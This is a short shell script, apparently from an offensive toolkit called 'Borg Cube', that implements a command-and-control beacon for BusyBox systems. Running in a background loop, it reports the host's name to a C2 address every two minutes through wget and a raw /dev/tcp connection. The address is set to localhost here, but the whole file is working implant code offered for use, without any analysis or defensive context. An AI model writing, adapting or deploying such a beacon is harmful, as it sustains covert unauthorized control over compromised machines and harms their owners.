#!/bin/sh
# BusyBox-compatible C2 beacon — no Python required
# Delivered by Borg Cube Phase 9
C2_PORT="10001"
C2_IP="127.0.0.1"
TOKEN=$(cat /proc/sys/kernel/hostname 2>/dev/null || hostname 2>/dev/null || echo "unknown")
while :; do
  wget -q "http://${C2_IP}:${C2_PORT}/beacon?id=${TOKEN}" -O /dev/null 2>/dev/null
  if [ -r /dev/tcp ]; then
    exec 3<>/dev/tcp/${C2_IP}/${C2_PORT}
    echo "BEACON ${TOKEN}" >&3
    exec 3<&-
  fi
  sleep 120
done &
